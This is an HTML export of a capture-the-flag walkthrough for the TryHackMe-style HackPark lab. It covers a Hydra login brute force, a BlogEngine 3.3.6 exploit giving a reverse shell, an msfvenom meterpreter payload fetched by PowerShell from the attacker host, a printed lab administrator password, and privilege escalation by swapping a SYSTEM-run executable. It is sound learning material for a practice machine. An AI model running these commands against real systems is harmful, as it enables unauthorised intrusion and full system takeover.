<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>hackpark</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>hackpark</h1><br/><strong>HackPark</strong><br /><br /><br />What is the name of the joker ?<br /><br />Download the image. Then search the image by uplading it to <strong>google image search</strong>.<br /><br /><br /><strong>Brute Force the Login Page using Hydra:</strong><br /><br />hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.229.129 http-post-form &quot;/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=75frL29Jq77UAS5O6waIAgvpqUOtcagLXmAs8ntJGK3DU6IXmkigWCYXlctGEb2O2G%2BjF5IteFOYg9pWj2Mqq0iJxVrJkUODXhUuOJ8sbmce0tBELKmw72s8I9JOUKGp6Z87DHYCwVZSIB1k8QZzxc%2BDfuwsKdSogudxveYfMl9Xl9WN&amp;__EVENTVALIDATION=kEqTpl3NK636vrrQoIGLwaBPeMNLrYgB5eLO2J3lhWCriHgdsDifHhxinhhtmfiV8p%2Fdx0IPiK0B5uO5gDR8tsJcKtQEVnqRqGuba%2BcImoxZrFAdTL%2FfNB4nBipBifGFewi7YAqZ8JhkThaZTfMnUpVOTH8tU0jzP03GuC7bHCt9G9K1&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&quot; -vv<br /><br /><a href=""><img src="images/115-1.png" alt="images/115-1.png" /></a><br /><br />Check the section <strong>[Cryptography--------&gt;hydra]</strong> for more details.<br /><br />After login we find the version of application : Blogengine 3.3.6<br />searchsploit blogengine<br /><a href=""><img src="images/115-2.png" alt="images/115-2.png" /></a><br /><br /><br />We will use the 46353.cs<br />searchsploit -m aspx/webapps/46353.cs<br /><br />Read the file. (And Finish the tasks)<br /><br />1.Start Netcat listener<br />2.Change the IP &amp; Port for reverse connection inside the file.<br />3.Rename the file to the one specified in the file (PostView.ascx)<br />4.Follow the guide for upload<br />5.Finally follow the guide for exploitation<br /><br />Once we have reverse shell. We need to switch to meterpreter for better control.<br /><br /><strong>Shell Switch</strong><br />Now, we switch to meterpreter shell for easier prevelege escalation.<br /><br />we make a meterpreter payload using msfvenom.<br /><em><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.72.31 LPORT=8888 -a x86 --encoder x86/shikata_ga_nai -f exe -o hackpark_revshell.exe</strong></em><br /><br />We host this using python webserver.<br /><br />Download using the last Powershell technique or any other.<br /><em><strong>powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.11.72.31:8000/hackpark_revshell.exe&#39;,&#39;hackpark_revshell.exe&#39;)&quot;</strong></em><br /><br /><strong><br />Start Listner in msfconsole:</strong><br /><br /><em><strong>use multi/handler<br />SET PAYLOAD windows/meterpreter/reverse_tcp<br />SET LHOST 10.11.72.31<br />SET LPORT 8888</strong></em><br /><br />Once setup â†’ Run the exploit in the shell we have.<br /><br /><br /><strong>Privilege Escalation:</strong><br />Now for Privelege Escalation there are 2 ways.<br /><br />Get winPEASx64.exe in the machine using meterpreter upload or powershell download.<br /><strong>powershell -c Invoke-WebRequest -Uri http://10.11.72.31/THM_WinPrivEsc_Tools/winPEASx64.exe -OutFile winPEASx64.exe</strong><br />Run the executible <strong>winPEASx64.exe</strong><br /><br /><strong><br />Way-1</strong><br />In stored credentials we find the credential of Administrator. (4q6XvFES7Fdxs)<br /><em><strong>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.229.129 /u:administrator /p:4q6XvFES7Fdxs</strong></em><br /><br />We get direct RDP access to machine with Administrator account.<br />We get the user and root flags.<br /><br /><strong>Way-2</strong><br />We check the service WindowsScheduler in hope that it allows us to run our binaries.<br />We check the <strong>C:/Program Files (x86)/WindowsScheduler/events</strong> Folder and check the logs.<br /><br />We find that <strong>Message.exe</strong> which has full access for everyone is run by <strong>system</strong> every 30 secs.<br /><br />We rename the Message.exe to Message.bak<br />Finally, we rename our previously crafted reverse shell to Message.exe and put it in that folder.<br /><br />We get ready in our multi/handler..<br /><br />We receive yet another session from the same payload, but this time it is owned by NT Authority/SYSTEM.<br />We get the user and root flags.<br /><br /><br />Thanks !!<br /></div>
</body>
</html>
